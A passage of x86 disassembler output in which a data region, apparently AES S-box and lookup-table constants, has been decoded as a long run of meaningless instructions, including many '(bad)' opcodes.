  40287f:	22 bb 69 69 d2 70    	and    0x70d26969(%ebx),%bh
  402885:	d9 d9                	(bad)
  402887:	a9 89 8e 8e 07       	test   $0x78e8e89,%eax
  40288c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40288d:	94                   	xchg   %eax,%esp
  40288e:	94                   	xchg   %eax,%esp
  40288f:	33 b6 9b 9b 2d 22    	xor    0x222d9b9b(%esi),%esi
  402895:	1e                   	push   %ds
  402896:	1e                   	push   %ds
  402897:	3c 92                	cmp    $0x92,%al
  402899:	87 87 15 20 e9 e9    	xchg   %eax,-0x1616dfeb(%edi)
  40289f:	c9                   	leave
  4028a0:	49                   	dec    %ecx
  4028a1:	ce                   	into
  4028a2:	ce                   	into
  4028a3:	87 ff                	xchg   %edi,%edi
  4028a5:	55                   	push   %ebp
  4028a6:	55                   	push   %ebp
  4028a7:	aa                   	stos   %al,%es:(%edi)
  4028a8:	78 28                	js     0x4028d2
  4028aa:	28 50 7a             	sub    %dl,0x7a(%eax)
  4028ad:	df df                	(bad)
  4028af:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4028b0:	8f                   	(bad)
  4028b1:	8c 8c 03 f8 a1 a1 59 	mov    %cs,0x59a1a1f8(%ebx,%eax,1)
  4028b8:	80 89 89 09 17 0d 0d 	orb    $0xd,0xd170989(%ecx)
  4028bf:	1a da                	sbb    %dl,%bl
  4028c1:	bf bf 65 31 e6       	mov    $0xe63165bf,%edi
  4028c6:	e6 d7                	out    %al,$0xd7
  4028c8:	c6 42 42 84          	movb   $0x84,0x42(%edx)
  4028cc:	b8 68 68 d0 c3       	mov    $0xc3d06868,%eax
  4028d1:	41                   	inc    %ecx
  4028d2:	41                   	inc    %ecx
  4028d3:	82 b0 99 99 29 77 2d 	xorb   $0x2d,0x77299999(%eax)
  4028da:	2d 5a 11 0f 0f       	sub    $0xf0f115a,%eax
  4028df:	1e                   	push   %ds
  4028e0:	cb                   	lret
  4028e1:	b0 b0                	mov    $0xb0,%al
  4028e3:	7b fc                	jnp    0x4028e1
  4028e5:	54                   	push   %esp
  4028e6:	54                   	push   %esp
  4028e7:	a8 d6                	test   $0xd6,%al
  4028e9:	bb bb 6d 3a 16       	mov    $0x163a6dbb,%ebx
  4028ee:	16                   	push   %ss
  4028ef:	2c 63                	sub    $0x63,%al
  4028f1:	63 c6                	arpl   %eax,%esi
  4028f3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4028f4:	7c 7c                	jl     0x402972
  4028f6:	f8                   	clc
  4028f7:	84 77 77             	test   %dh,0x77(%edi)
  4028fa:	ee                   	out    %al,(%dx)
  4028fb:	99                   	cltd
  4028fc:	7b 7b                	jnp    0x402979
  4028fe:	f6 8d f2 f2 ff 0d 6b 	testb  $0x6b,0xdfff2f2(%ebp)
  402905:	6b d6 bd             	imul   $0xffffffbd,%esi,%edx
  402908:	6f                   	outsl  %ds:(%esi),(%dx)
  402909:	6f                   	outsl  %ds:(%esi),(%dx)
  40290a:	de b1 c5 c5 91 54    	fidivs 0x5491c5c5(%ecx)
  402910:	30 30                	xor    %dh,(%eax)
  402912:	60                   	pusha
  402913:	50                   	push   %eax
  402914:	01 01                	add    %eax,(%ecx)
  402916:	02 03                	add    (%ebx),%al
  402918:	67 67 ce             	addr16 addr16 into
  40291b:	a9 2b 2b 56 7d       	test   $0x7d562b2b,%eax
  402920:	fe                   	(bad)
  402921:	fe                   	(bad)
  402922:	e7 19                	out    %eax,$0x19
  402924:	d7                   	xlat   %ds:(%ebx)
  402925:	d7                   	xlat   %ds:(%ebx)
  402926:	b5 62                	mov    $0x62,%ch
  402928:	ab                   	stos   %eax,%es:(%edi)
  402929:	ab                   	stos   %eax,%es:(%edi)
  40292a:	4d                   	dec    %ebp
  40292b:	e6 76                	out    %al,$0x76
  40292d:	76 ec                	jbe    0x40291b
  40292f:	9a ca ca 8f 45 82 82 	lcall  $0x8282,$0x458fcaca
  402936:	1f                   	pop    %ds
  402937:	9d                   	popf
  402938:	c9                   	leave
  402939:	c9                   	leave
  40293a:	89 40 7d             	mov    %eax,0x7d(%eax)
  40293d:	7d fa                	jge    0x402939
  40293f:	87 fa                	xchg   %edi,%edx
  402941:	fa                   	cli
  402942:	ef                   	out    %eax,(%dx)
  402943:	15 59 59 b2 eb       	adc    $0xebb25959,%eax
  402948:	47                   	inc    %edi
  402949:	47                   	inc    %edi
  40294a:	8e c9                	mov    %ecx,%cs
  40294c:	f0 f0 fb             	lock lock sti
  40294f:	0b ad ad 41 ec d4    	or     -0x2b13be53(%ebp),%ebp
  402955:	d4 b3                	aam    $0xb3
  402957:	67 a2 a2 5f          	addr16 mov %al,0x5fa2
  40295b:	fd                   	std
  40295c:	af                   	scas   %es:(%edi),%eax
  40295d:	af                   	scas   %es:(%edi),%eax
  40295e:	45                   	inc    %ebp
  40295f:	ea 9c 9c 23 bf a4 a4 	ljmp   $0xa4a4,$0xbf239c9c
  402966:	53                   	push   %ebx
  402967:	f7 72 72             	divl   0x72(%edx)
  40296a:	e4 96                	in     $0x96,%al
  40296c:	c0 c0 9b             	rol    $0x9b,%al
  40296f:	5b                   	pop    %ebx
  402970:	b7 b7                	mov    $0xb7,%bh
  402972:	75 c2                	jne    0x402936
  402974:	fd                   	std
  402975:	fd                   	std
  402976:	e1 1c                	loope  0x402994
  402978:	93                   	xchg   %eax,%ebx
  402979:	93                   	xchg   %eax,%ebx
  40297a:	3d ae 26 26 4c       	cmp    $0x4c2626ae,%eax
  40297f:	6a 36                	push   $0x36
  402981:	36 6c                	ss insb (%dx),%es:(%edi)
  402983:	5a                   	pop    %edx
  402984:	3f                   	aas
  402985:	3f                   	aas
  402986:	7e 41                	jle    0x4029c9
  402988:	f7 f7                	div    %edi
  40298a:	f5                   	cmc
  40298b:	02 cc                	add    %ah,%cl
  40298d:	cc                   	int3
  40298e:	83 4f 34 34          	orl    $0x34,0x34(%edi)
  402992:	68 5c a5 a5 51       	push   $0x51a5a55c
  402997:	f4                   	hlt
  402998:	e5 e5                	in     $0xe5,%eax
  40299a:	d1 34 f1             	shll   $1,(%ecx,%esi,8)
  40299d:	f1                   	int1
  40299e:	f9                   	stc
  40299f:	08 71 71             	or     %dh,0x71(%ecx)
  4029a2:	e2 93                	loop   0x402937
  4029a4:	d8 d8                	fcomp  %st(0)
  4029a6:	ab                   	stos   %eax,%es:(%edi)
  4029a7:	73 31                	jae    0x4029da
  4029a9:	31 62 53             	xor    %esp,0x53(%edx)
  4029ac:	15 15 2a 3f 04       	adc    $0x43f2a15,%eax
  4029b1:	04 08                	add    $0x8,%al
  4029b3:	0c c7                	or     $0xc7,%al
  4029b5:	c7                   	(bad)
  4029b6:	95                   	xchg   %eax,%ebp
  4029b7:	52                   	push   %edx
  4029b8:	23 23                	and    (%ebx),%esp
  4029ba:	46                   	inc    %esi
  4029bb:	65 c3                	gs ret
  4029bd:	c3                   	ret
  4029be:	9d                   	popf
  4029bf:	5e                   	pop    %esi
  4029c0:	18 18                	sbb    %bl,(%eax)
  4029c2:	30 28                	xor    %ch,(%eax)
  4029c4:	96                   	xchg   %eax,%esi
  4029c5:	96                   	xchg   %eax,%esi
  4029c6:	37                   	aaa
  4029c7:	a1 05 05 0a 0f       	mov    0xf0a0505,%eax
  4029cc:	9a 9a 2f b5 07 07 0e 	lcall  $0xe07,$0x7b52f9a
  4029d3:	09 12                	or     %edx,(%edx)
  4029d5:	12 24 36             	adc    (%esi,%esi,1),%ah
  4029d8:	80 80 1b 9b e2 e2 df 	addb   $0xdf,-0x1d1d64e5(%eax)
  4029df:	3d eb eb cd 26       	cmp    $0x26cdebeb,%eax
  4029e4:	27                   	daa
  4029e5:	27                   	daa
  4029e6:	4e                   	dec    %esi
  4029e7:	69 b2 b2 7f cd 75 75 	imul   $0x99fea75,0x75cd7fb2(%edx),%esi
  4029ee:	ea 9f 09 
  4029f1:	09 12                	or     %edx,(%edx)
  4029f3:	1b 83 83 1d 9e 2c    	sbb    0x2c9e1d83(%ebx),%eax
  4029f9:	2c 58                	sub    $0x58,%al
  4029fb:	74 1a                	je     0x402a17
  4029fd:	1a 34 2e             	sbb    (%esi,%ebp,1),%dh
  402a00:	1b 1b                	sbb    (%ebx),%ebx
  402a02:	36 2d 6e 6e dc b2    	ss sub $0xb2dc6e6e,%eax
  402a08:	5a                   	pop    %edx
  402a09:	5a                   	pop    %edx
  402a0a:	b4 ee                	mov    $0xee,%ah
  402a0c:	a0 a0 5b fb 52       	mov    0x52fb5ba0,%al
  402a11:	52                   	push   %edx
  402a12:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402a13:	f6 3b                	idivb  (%ebx)
  402a15:	3b 76 4d             	cmp    0x4d(%esi),%esi
  402a18:	d6                   	salc
  402a19:	d6                   	salc
  402a1a:	b7 61                	mov    $0x61,%bh
  402a1c:	b3 b3                	mov    $0xb3,%bl
  402a1e:	7d ce                	jge    0x4029ee
  402a20:	29 29                	sub    %ebp,(%ecx)
  402a22:	52                   	push   %edx
  402a23:	7b e3                	jnp    0x402a08
  402a25:	e3 dd                	jecxz  0x402a04
  402a27:	3e 2f                	ds das
  402a29:	2f                   	das
  402a2a:	5e                   	pop    %esi
  402a2b:	71 84                	jno    0x4029b1
  402a2d:	84 13                	test   %dl,(%ebx)
  402a2f:	97                   	xchg   %eax,%edi
  402a30:	53                   	push   %ebx
  402a31:	53                   	push   %ebx
  402a32:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402a33:	f5                   	cmc
  402a34:	d1 d1                	rcl    $1,%ecx
  402a36:	b9 68 00 00 00       	mov    $0x68,%ecx
  402a3b:	00 ed                	add    %ch,%ch
  402a3d:	ed                   	in     (%dx),%eax
  402a3e:	c1 2c 20 20          	shrl   $0x20,(%eax,%eiz,1)
  402a42:	40                   	inc    %eax
  402a43:	60                   	pusha
  402a44:	fc                   	cld
  402a45:	fc                   	cld
  402a46:	e3 1f                	jecxz  0x402a67
  402a48:	b1 b1                	mov    $0xb1,%cl
  402a4a:	79 c8                	jns    0x402a14
  402a4c:	5b                   	pop    %ebx
  402a4d:	5b                   	pop    %ebx
  402a4e:	b6 ed                	mov    $0xed,%dh
  402a50:	6a 6a                	push   $0x6a
  402a52:	d4 be                	aam    $0xbe
  402a54:	cb                   	lret
  402a55:	cb                   	lret
  402a56:	8d 46 be             	lea    -0x42(%esi),%eax
  402a59:	be 67 d9 39 39       	mov    $0x3939d967,%esi
  402a5e:	72 4b                	jb     0x402aab
  402a60:	4a                   	dec    %edx
  402a61:	4a                   	dec    %edx
  402a62:	94                   	xchg   %eax,%esp
  402a63:	de 4c 4c 98          	fimuls -0x68(%esp,%ecx,2)
  402a67:	d4 58                	aam    $0x58
  402a69:	58                   	pop    %eax
  402a6a:	b0 e8                	mov    $0xe8,%al
  402a6c:	cf                   	iret
  402a6d:	cf                   	iret
  402a6e:	85 4a d0             	test   %ecx,-0x30(%edx)
  402a71:	d0 bb 6b ef ef c5    	sarb   $1,-0x3a101095(%ebx)
  402a77:	2a aa aa 4f e5 fb    	sub    -0x41ab056(%edx),%ch
  402a7d:	fb                   	sti
  402a7e:	ed                   	in     (%dx),%eax
  402a7f:	16                   	push   %ss
  402a80:	43                   	inc    %ebx
  402a81:	43                   	inc    %ebx
  402a82:	86 c5                	xchg   %al,%ch
  402a84:	4d                   	dec    %ebp
  402a85:	4d                   	dec    %ebp
  402a86:	9a d7 33 33 66 55 85 	lcall  $0x8555,$0x663333d7
  402a8d:	85 11                	test   %edx,(%ecx)
  402a8f:	94                   	xchg   %eax,%esp
  402a90:	45                   	inc    %ebp
  402a91:	45                   	inc    %ebp
  402a92:	8a cf                	mov    %bh,%cl
  402a94:	f9                   	stc
  402a95:	f9                   	stc
  402a96:	e9 10 02 02 04       	jmp    0x4422cab
  402a9b:	06                   	push   %es
  402a9c:	7f 7f                	jg     0x402b1d
  402a9e:	fe 81 50 50 a0 f0    	incb   -0xf5fafb0(%ecx)
  402aa4:	3c 3c                	cmp    $0x3c,%al
  402aa6:	78 44                	js     0x402aec
  402aa8:	9f                   	lahf
  402aa9:	9f                   	lahf
  402aaa:	25 ba a8 a8 4b       	and    $0x4ba8a8ba,%eax
  402aaf:	e3 51                	jecxz  0x402b02
  402ab1:	51                   	push   %ecx
  402ab2:	a2 f3 a3 a3 5d       	mov    %al,0x5da3a3f3
  402ab7:	fe 40 40             	incb   0x40(%eax)
  402aba:	80 c0 8f             	add    $0x8f,%al
  402abd:	8f 05 8a 92 92 3f    	pop    0x3f92928a
  402ac3:	ad                   	lods   %ds:(%esi),%eax
  402ac4:	9d                   	popf
  402ac5:	9d                   	popf
  402ac6:	21 bc 38 38 70 48 f5 	and    %edi,-0xab78fc8(%eax,%edi,1)
  402acd:	f5                   	cmc
  402ace:	f1                   	int1
  402acf:	04 bc                	add    $0xbc,%al
  402ad1:	bc 63 df b6 b6       	mov    $0xb6b6df63,%esp
  402ad6:	77 c1                	ja     0x402a99
  402ad8:	da da                	fcmovu %st(2),%st
  402ada:	af                   	scas   %es:(%edi),%eax
  402adb:	75 21                	jne    0x402afe
  402add:	21 42 63             	and    %eax,0x63(%edx)
  402ae0:	10 10                	adc    %dl,(%eax)
  402ae2:	20 30                	and    %dh,(%eax)
  402ae4:	ff                   	(bad)
  402ae5:	ff e5                	jmp    *%ebp
  402ae7:	1a f3                	sbb    %bl,%dh
  402ae9:	f3 fd                	repz std
  402aeb:	0e                   	push   %cs
  402aec:	d2 d2                	rcl    %cl,%dl
  402aee:	bf 6d cd cd 81       	mov    $0x81cdcd6d,%edi
  402af3:	4c                   	dec    %esp
  402af4:	0c 0c                	or     $0xc,%al
  402af6:	18 14 13             	sbb    %dl,(%ebx,%edx,1)
  402af9:	13 26                	adc    (%esi),%esp
  402afb:	35 ec ec c3 2f       	xor    $0x2fc3ecec,%eax
  402b00:	5f                   	pop    %edi
  402b01:	5f                   	pop    %edi
  402b02:	be e1 97 97 35       	mov    $0x359797e1,%esi
  402b07:	a2 44 44 88 cc       	mov    %al,0xcc884444
  402b0c:	17                   	pop    %ss
  402b0d:	17                   	pop    %ss
  402b0e:	2e 39 c4             	cs cmp %eax,%esp
  402b11:	c4 93 57 a7 a7 55    	les    0x55a7a757(%ebx),%edx
  402b17:	f2 7e 7e             	bnd jle 0x402b98
  402b1a:	fc                   	cld
  402b1b:	82 3d 3d 7a 47 64 64 	cmpb   $0x64,0x64477a3d
  402b22:	c8 ac 5d 5d          	enter  $0x5dac,$0x5d
  402b26:	ba e7 19 19 32       	mov    $0x321919e7,%edx
  402b2b:	2b 73 73             	sub    0x73(%ebx),%esi
  402b2e:	e6 95                	out    %al,$0x95
  402b30:	60                   	pusha
  402b31:	60                   	pusha
  402b32:	c0 a0 81 81 19 98 4f 	shlb   $0x4f,-0x67e67e7f(%eax)
  402b39:	4f                   	dec    %edi
  402b3a:	9e                   	sahf
  402b3b:	d1 dc                	rcr    $1,%esp
  402b3d:	dc a3 7f 22 22 44    	fsubl  0x4422227f(%ebx)
  402b43:	66 2a 2a             	data16 sub (%edx),%ch
  402b46:	54                   	push   %esp
  402b47:	7e 90                	jle    0x402ad9
  402b49:	90                   	nop
  402b4a:	3b ab 88 88 0b 83    	cmp    -0x7cf47778(%ebx),%ebp
  402b50:	46                   	inc    %esi
  402b51:	46                   	inc    %esi
  402b52:	8c ca                	mov    %cs,%edx
  402b54:	ee                   	out    %al,(%dx)
  402b55:	ee                   	out    %al,(%dx)
  402b56:	c7                   	(bad)
  402b57:	29 b8 b8 6b d3 14    	sub    %edi,0x14d36bb8(%eax)
  402b5d:	14 28                	adc    $0x28,%al
  402b5f:	3c de                	cmp    $0xde,%al
  402b61:	de a7 79 5e 5e bc    	fisubs -0x43a1a187(%edi)
  402b67:	e2 0b                	loop   0x402b74
  402b69:	0b 16                	or     (%esi),%edx
  402b6b:	1d db db ad 76       	sbb    $0x76addbdb,%eax
  402b70:	e0 e0                	loopne 0x402b52
  402b72:	db 3b                	fstpt  (%ebx)
  402b74:	32 32                	xor    (%edx),%dh
  402b76:	64 56                	fs push %esi
  402b78:	3a 3a                	cmp    (%edx),%bh
  402b7a:	74 4e                	je     0x402bca
  402b7c:	0a 0a                	or     (%edx),%cl
  402b7e:	14 1e                	adc    $0x1e,%al
  402b80:	49                   	dec    %ecx
  402b81:	49                   	dec    %ecx
  402b82:	92                   	xchg   %eax,%edx
  402b83:	db 06                	fildl  (%esi)
  402b85:	06                   	push   %es
  402b86:	0c 0a                	or     $0xa,%al
  402b88:	24 24                	and    $0x24,%al
  402b8a:	48                   	dec    %eax
  402b8b:	6c                   	insb   (%dx),%es:(%edi)
  402b8c:	5c                   	pop    %esp
  402b8d:	5c                   	pop    %esp
  402b8e:	b8 e4 c2 c2 9f       	mov    $0x9fc2c2e4,%eax
  402b93:	5d                   	pop    %ebp
  402b94:	d3 d3                	rcl    %cl,%ebx
  402b96:	bd 6e ac ac 43       	mov    $0x43acac6e,%ebp
  402b9b:	ef                   	out    %eax,(%dx)
  402b9c:	62 62 c4             	bound  %esp,-0x3c(%edx)
  402b9f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402ba0:	91                   	xchg   %eax,%ecx
  402ba1:	91                   	xchg   %eax,%ecx
  402ba2:	39 a8 95 95 31 a4    	cmp    %ebp,-0x5bce6a6b(%eax)
  402ba8:	e4 e4                	in     $0xe4,%al
  402baa:	d3 37                	shll   %cl,(%edi)
  402bac:	79 79                	jns    0x402c27
  402bae:	f2 8b e7             	repnz mov %edi,%esp
  402bb1:	e7 d5                	out    %eax,$0xd5
  402bb3:	32 c8                	xor    %al,%cl
  402bb5:	c8 8b 43 37          	enter  $0x438b,$0x37
  402bb9:	37                   	aaa
  402bba:	6e                   	outsb  %ds:(%esi),(%dx)
  402bbb:	59                   	pop    %ecx
  402bbc:	6d                   	insl   (%dx),%es:(%edi)
  402bbd:	6d                   	insl   (%dx),%es:(%edi)
  402bbe:	da b7 8d 8d 01 8c    	fidivl -0x73fe7273(%edi)
  402bc4:	d5 d5                	aad    $0xd5
  402bc6:	b1 64                	mov    $0x64,%cl
  402bc8:	4e                   	dec    %esi
  402bc9:	4e                   	dec    %esi
  402bca:	9c                   	pushf
  402bcb:	d2 a9 a9 49 e0 6c    	shrb   %cl,0x6ce049a9(%ecx)
  402bd1:	6c                   	insb   (%dx),%es:(%edi)
  402bd2:	d8 b4 56 56 ac fa f4 	fdivs  -0xb0553aa(%esi,%edx,2)
  402bd9:	f4                   	hlt
  402bda:	f3 07                	repz pop %es
  402bdc:	ea ea cf 25 65 65 ca 	ljmp   $0xca65,$0x6525cfea
  402be3:	af                   	scas   %es:(%edi),%eax
  402be4:	7a 7a                	jp     0x402c60
  402be6:	f4                   	hlt
  402be7:	8e ae ae 47 e9 08    	mov    0x8e947ae(%esi),%gs
  402bed:	08 10                	or     %dl,(%eax)
  402bef:	18 ba ba 6f d5 78    	sbb    %bh,0x78d56fba(%edx)
  402bf5:	78 f0                	js     0x402be7
  402bf7:	88 25 25 4a 6f 2e    	mov    %ah,0x2e6f4a25
  402bfd:	2e 5c                	cs pop %esp
  402bff:	72 1c                	jb     0x402c1d
  402c01:	1c 38                	sbb    $0x38,%al
  402c03:	24 a6                	and    $0xa6,%al
  402c05:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402c06:	57                   	push   %edi
  402c07:	f1                   	int1
  402c08:	b4 b4                	mov    $0xb4,%ah
  402c0a:	73 c7                	jae    0x402bd3
  402c0c:	c6 c6 97             	mov    $0x97,%dh
  402c0f:	51                   	push   %ecx
  402c10:	e8 e8 cb 23 dd       	call   0xdd63f7fd
  402c15:	dd a1 7c 74 74 e8    	frstor -0x178b8b84(%ecx)
  402c1b:	9c                   	pushf
  402c1c:	1f                   	pop    %ds
  402c1d:	1f                   	pop    %ds
  402c1e:	3e 21 4b 4b          	and    %ecx,%ds:0x4b(%ebx)
  402c22:	96                   	xchg   %eax,%esi
  402c23:	dd bd bd 61 dc 8b    	fnstsw -0x74239e43(%ebp)
  402c29:	8b 0d 86 8a 8a 0f    	mov    0xf8a8a86,%ecx
  402c2f:	85 70 70             	test   %esi,0x70(%eax)
  402c32:	e0 90                	loopne 0x402bc4
  402c34:	3e 3e 7c 42          	ds jl,pt 0x402c7a
  402c38:	b5 b5                	mov    $0xb5,%ch
  402c3a:	71 c4                	jno    0x402c00
  402c3c:	66 66 cc             	data16 data16 int3
  402c3f:	aa                   	stos   %al,%es:(%edi)
  402c40:	48                   	dec    %eax
  402c41:	48                   	dec    %eax
  402c42:	90                   	nop
  402c43:	d8 03                	fadds  (%ebx)
  402c45:	03 06                	add    (%esi),%eax
  402c47:	05 f6 f6 f7 01       	add    $0x1f7f6f6,%eax
  402c4c:	0e                   	push   %cs
  402c4d:	0e                   	push   %cs
  402c4e:	1c 12                	sbb    $0x12,%al
  402c50:	61                   	popa
  402c51:	61                   	popa
  402c52:	c2 a3 35             	ret    $0x35a3
  402c55:	35 6a 5f 57 57       	xor    $0x57575f6a,%eax
  402c5a:	ae                   	scas   %es:(%edi),%al
  402c5b:	f9                   	stc
  402c5c:	b9 b9 69 d0 86       	mov    $0x86d069b9,%ecx
  402c61:	86 17                	xchg   %dl,(%edi)
  402c63:	91                   	xchg   %eax,%ecx
  402c64:	c1 c1 99             	rol    $0x99,%ecx
  402c67:	58                   	pop    %eax
  402c68:	1d 1d 3a 27 9e       	sbb    $0x9e273a1d,%eax
  402c6d:	9e                   	sahf
  402c6e:	27                   	daa
  402c6f:	b9 e1 e1 d9 38       	mov    $0x38d9e1e1,%ecx
  402c74:	f8                   	clc
  402c75:	f8                   	clc
  402c76:	eb 13                	jmp    0x402c8b
  402c78:	98                   	cwtl
  402c79:	98                   	cwtl
  402c7a:	2b b3 11 11 22 33    	sub    0x33221111(%ebx),%esi
  402c80:	69 69 d2 bb d9 d9 a9 	imul   $0xa9d9d9bb,-0x2e(%ecx),%ebp
  402c87:	70 8e                	jo     0x402c17
  402c89:	8e 07                	mov    (%edi),%es
  402c8b:	89 94 94 33 a7 9b 9b 	mov    %edx,-0x646458cd(%esp,%edx,4)
  402c92:	2d b6 1e 1e 3c       	sub    $0x3c1e1eb6,%eax
  402c97:	22 87 87 15 92 e9    	and    -0x166dea79(%edi),%al
  402c9d:	e9 c9 20 ce ce       	jmp    0xcf0e4d6b
  402ca2:	87 49 55             	xchg   %ecx,0x55(%ecx)
  402ca5:	55                   	push   %ebp
  402ca6:	aa                   	stos   %al,%es:(%edi)
  402ca7:	ff 28                	ljmp   *(%eax)
  402ca9:	28 50 78             	sub    %dl,0x78(%eax)
  402cac:	df df                	(bad)
  402cae:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402caf:	7a 8c                	jp     0x402c3d
  402cb1:	8c 03                	mov    %es,(%ebx)
  402cb3:	8f                   	(bad)
  402cb4:	a1 a1 59 f8 89       	mov    0x89f859a1,%eax
  402cb9:	89 09                	mov    %ecx,(%ecx)
  402cbb:	80 0d 0d 1a 17 bf bf 	orb    $0xbf,0xbf171a0d
  402cc2:	65 da e6             	gs (bad)
  402cc5:	e6 d7                	out    %al,$0xd7
  402cc7:	31 42 42             	xor    %eax,0x42(%edx)
  402cca:	84 c6                	test   %al,%dh
  402ccc:	68 68 d0 b8 41       	push   $0x41b8d068
  402cd1:	41                   	inc    %ecx
  402cd2:	82 c3 99             	add    $0x99,%bl
  402cd5:	99                   	cltd
  402cd6:	29 b0 2d 2d 5a 77    	sub    %esi,0x775a2d2d(%eax)
  402cdc:	0f                   	(bad)
  402cdd:	0f 1e 11             	nopl   (%ecx)
  402ce0:	b0 b0                	mov    $0xb0,%al
  402ce2:	7b cb                	jnp    0x402caf
  402ce4:	54                   	push   %esp
  402ce5:	54                   	push   %esp
  402ce6:	a8 fc                	test   $0xfc,%al
  402ce8:	bb bb 6d d6 16       	mov    $0x16d66dbb,%ebx
  402ced:	16                   	push   %ss
  402cee:	2c 3a                	sub    $0x3a,%al
  402cf0:	63 c6                	arpl   %eax,%esi
  402cf2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402cf3:	63 7c f8 84          	arpl   %edi,-0x7c(%eax,%edi,8)
  402cf7:	7c 77                	jl     0x402d70
  402cf9:	ee                   	out    %al,(%dx)
  402cfa:	99                   	cltd
  402cfb:	77 7b                	ja     0x402d78
  402cfd:	f6 8d 7b f2 ff 0d f2 	testb  $0xf2,0xdfff27b(%ebp)
  402d04:	6b d6 bd             	imul   $0xffffffbd,%esi,%edx
  402d07:	6b 6f de b1          	imul   $0xffffffb1,-0x22(%edi),%ebp
  402d0b:	6f                   	outsl  %ds:(%esi),(%dx)
  402d0c:	c5 91 54 c5 30 60    	lds    0x6030c554(%ecx),%edx
  402d12:	50                   	push   %eax
  402d13:	30 01                	xor    %al,(%ecx)
  402d15:	02 03                	add    (%ebx),%al
  402d17:	01 67 ce             	add    %esp,-0x32(%edi)
  402d1a:	a9 67 2b 56 7d       	test   $0x7d562b67,%eax
  402d1f:	2b fe                	sub    %esi,%edi
  402d21:	e7 19                	out    %eax,$0x19
  402d23:	fe                   	(bad)
  402d24:	d7                   	xlat   %ds:(%ebx)
  402d25:	b5 62                	mov    $0x62,%ch
  402d27:	d7                   	xlat   %ds:(%ebx)
  402d28:	ab                   	stos   %eax,%es:(%edi)
  402d29:	4d                   	dec    %ebp
  402d2a:	e6 ab                	out    %al,$0xab
  402d2c:	76 ec                	jbe    0x402d1a
  402d2e:	9a 76 ca 8f 45 ca 82 	lcall  $0x82ca,$0x458fca76
  402d35:	1f                   	pop    %ds
  402d36:	9d                   	popf
  402d37:	82 c9 89             	or     $0x89,%cl
  402d3a:	40                   	inc    %eax
  402d3b:	c9                   	leave
  402d3c:	7d fa                	jge    0x402d38
  402d3e:	87 7d fa             	xchg   %edi,-0x6(%ebp)
  402d41:	ef                   	out    %eax,(%dx)
  402d42:	15 fa 59 b2 eb       	adc    $0xebb259fa,%eax
  402d47:	59                   	pop    %ecx
  402d48:	47                   	inc    %edi
  402d49:	8e c9                	mov    %ecx,%cs
  402d4b:	47                   	inc    %edi
  402d4c:	f0 fb                	lock sti
  402d4e:	0b f0                	or     %eax,%esi
  402d50:	ad                   	lods   %ds:(%esi),%eax
  402d51:	41                   	inc    %ecx
  402d52:	ec                   	in     (%dx),%al
  402d53:	ad                   	lods   %ds:(%esi),%eax
  402d54:	d4 b3                	aam    $0xb3
  402d56:	67 d4 a2             	addr16 aam $0xa2
  402d59:	5f                   	pop    %edi
  402d5a:	fd                   	std
  402d5b:	a2 af 45 ea af       	mov    %al,0xafea45af
  402d60:	9c                   	pushf
  402d61:	23 bf 9c a4 53 f7    	and    -0x8ac5b64(%edi),%edi
  402d67:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402d68:	72 e4                	jb     0x402d4e
  402d6a:	96                   	xchg   %eax,%esi
  402d6b:	72 c0                	jb     0x402d2d
  402d6d:	9b                   	fwait
  402d6e:	5b                   	pop    %ebx
  402d6f:	c0 b7 75 c2 b7 fd e1 	shlb   $0xe1,-0x2483d8b(%edi)
  402d76:	1c fd                	sbb    $0xfd,%al
  402d78:	93                   	xchg   %eax,%ebx
  402d79:	3d ae 93 26 4c       	cmp    $0x4c2693ae,%eax
  402d7e:	6a 26                	push   $0x26
  402d80:	36 6c                	ss insb (%dx),%es:(%edi)
  402d82:	5a                   	pop    %edx
  402d83:	36 3f                	ss aas
  402d85:	7e 41                	jle    0x402dc8
  402d87:	3f                   	aas
  402d88:	f7 f5                	div    %ebp
  402d8a:	02 f7                	add    %bh,%dh
  402d8c:	cc                   	int3
  402d8d:	83 4f cc 34          	orl    $0x34,-0x34(%edi)
  402d91:	68 5c 34 a5 51       	push   $0x51a5345c
  402d96:	f4                   	hlt
  402d97:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402d98:	e5 d1                	in     $0xd1,%eax
  402d9a:	34 e5                	xor    $0xe5,%al
  402d9c:	f1                   	int1
  402d9d:	f9                   	stc
  402d9e:	08 f1                	or     %dh,%cl
  402da0:	71 e2                	jno    0x402d84
  402da2:	93                   	xchg   %eax,%ebx
  402da3:	71 d8                	jno    0x402d7d
  402da5:	ab                   	stos   %eax,%es:(%edi)
  402da6:	73 d8                	jae    0x402d80
  402da8:	31 62 53             	xor    %esp,0x53(%edx)
  402dab:	31 15 2a 3f 15 04    	xor    %edx,0x4153f2a
  402db1:	08 0c 04             	or     %cl,(%esp,%eax,1)
  402db4:	c7                   	(bad)
  402db5:	95                   	xchg   %eax,%ebp
  402db6:	52                   	push   %edx
  402db7:	c7                   	(bad)
  402db8:	23 46 65             	and    0x65(%esi),%eax
  402dbb:	23 c3                	and    %ebx,%eax
  402dbd:	9d                   	popf
  402dbe:	5e                   	pop    %esi
  402dbf:	c3                   	ret
  402dc0:	18 30                	sbb    %dh,(%eax)
  402dc2:	28 18                	sub    %bl,(%eax)
  402dc4:	96                   	xchg   %eax,%esi
  402dc5:	37                   	aaa
  402dc6:	a1 96 05 0a 0f       	mov    0xf0a0596,%eax
  402dcb:	05 9a 2f b5 9a       	add    $0x9ab52f9a,%eax
  402dd0:	07                   	pop    %es
  402dd1:	0e                   	push   %cs
  402dd2:	09 07                	or     %eax,(%edi)
  402dd4:	12 24 36             	adc    (%esi,%esi,1),%ah
  402dd7:	12 80 1b 9b 80 e2    	adc    -0x1d7f64e5(%eax),%al
  402ddd:	df 3d e2 eb cd 26    	fistpll 0x26cdebe2
  402de3:	eb 27                	jmp    0x402e0c
  402de5:	4e                   	dec    %esi
  402de6:	69 27 b2 7f cd b2    	imul   $0xb2cd7fb2,(%edi),%esp
  402dec:	75 ea                	jne    0x402dd8
  402dee:	9f                   	lahf
  402def:	75 09                	jne    0x402dfa
  402df1:	12 1b                	adc    (%ebx),%bl
